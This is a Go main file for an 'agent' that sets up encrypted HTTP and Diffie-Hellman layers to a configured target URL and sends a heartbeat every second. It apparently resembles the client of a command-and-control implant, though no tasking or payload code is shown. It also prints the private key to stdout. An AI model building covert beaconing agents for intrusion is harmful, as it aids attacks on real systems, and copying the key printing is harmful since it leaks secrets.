package main

import (
	"encoding/base64"
	"fmt"
	"time"

	"../crypto/dh"
	"./comm/layer0"
	"./comm/layer1"
)

func main() {
	config, err := LoadConfig("config.json")
	if err != nil {
		fmt.Printf("Error reading config file: %s\n", err)
		return
	}

	httpClient := layer0.NewHttpClient(config.TargetUrl)
	encHttpClient := layer0.NewEncryptedClient(httpClient, config.SymKey)

	keyExchange, err := dh.NewKeyExchange(config.PrivateKey)
	if err != nil {
		fmt.Printf("Error creating key exchange: %s\n", err)
		return
	}

	client := layer1.NewDHClient(keyExchange, encHttpClient)

	agent := NewAgent(client)

	encodedPrivateKey := base64.StdEncoding.EncodeToString(keyExchange.GetPrivateKey())
	fmt.Printf("Private Key: %s\n", encodedPrivateKey)

	for {
		agent.heartbeat()
		time.Sleep(1 * time.Second)
	}

}
